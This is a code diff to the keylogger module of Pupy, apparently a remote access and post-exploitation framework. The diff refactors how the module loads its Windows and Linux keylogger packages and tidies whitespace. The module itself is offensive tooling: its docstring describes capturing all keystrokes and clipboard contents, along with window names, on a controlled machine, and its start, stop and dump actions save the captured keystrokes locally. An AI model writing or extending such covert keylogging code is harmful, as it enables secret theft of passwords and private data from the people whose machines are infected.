@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 import StringIO
 import SocketServer
@@ -16,26 +16,26 @@ __class_name__="KeyloggerModule"
 
 @config(cat="gather", compat=["linux", "darwin", "windows"])
 class KeyloggerModule(PupyModule):
-    """ 
+    """
         A keylogger to monitor all keyboards interaction including the clipboard :-)
         The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
     """
     #max_clients=1
-    daemon=True
-    unique_instance=True
+    daemon = True
+    unique_instance = True
+    dependencies = {
+        'windows': [ 'pupwinutils.keylogger' ],
+        'linux': [ 'keylogger' ],
+    }
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
         self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
 
     def stop_daemon(self):
         self.success("keylogger stopped")
-        
-    def run(self, args):
-        if self.client.is_windows():
-            self.client.load_package("pupwinutils.keylogger")
-        else:
-            self.client.load_package("keylogger")
 
+    def run(self, args):
         if args.action=="start":
             if self.client.is_windows():
                 with redirected_stdio(self.client.conn): #to see the output exception in case of error
@@ -69,7 +69,7 @@ class KeyloggerModule(PupyModule):
                 os.makedirs(os.path.join("data","keystrokes"))
             except Exception:
                 pass
-            
+
             if self.client.is_windows():
                 data=self.client.conn.modules["pupwinutils.keylogger"].keylogger_dump()
             elif self.client.is_linux():
